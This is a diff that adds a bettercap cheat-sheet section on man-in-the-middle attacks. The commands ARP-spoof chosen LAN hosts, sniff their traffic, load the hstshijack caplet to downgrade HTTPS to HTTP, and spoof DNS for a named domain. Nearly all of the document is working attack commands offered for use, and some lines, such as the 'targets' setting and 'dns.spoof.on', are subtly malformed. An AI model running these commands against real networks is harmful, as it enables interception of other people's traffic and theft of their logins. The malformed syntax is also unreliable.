@@ -152,3 +152,32 @@ net.sniff on
 
 hstshijack/hstshijack
 
+
+"------------------------------------------------"
+"-> DNS SPOOFING WITH BETTERCAP"
+interface = "wlan0"
+caplet    = "$HOME/Desktop/caplet.cap"
+
+"-> $caplet Start with caplet file"
+bettercap -iface $interface [-caplet $caplet]
+
+caplets.update
+caplets.show
+
+net.probe on
+set arp.spoof fullduplex true
+set arp.spoof fullduplex targets 192.168.1.2
+"-> Multiple target"
+"-> set arp.spoof fullduplex targets 192.168.1.2, 192.168.1.3, 192.168.1.4 ..."
+arp.spoof on
+
+"-> For downgrade HTTPS to HTTP"
+set net.sniff.local true
+net.sniff on
+
+hstshijack/hstshijack
+
+set dns.spoof.all true
+set dns.spoof.domains zsecurity.org,*zsecurity.org
+dns.spoof.on
+
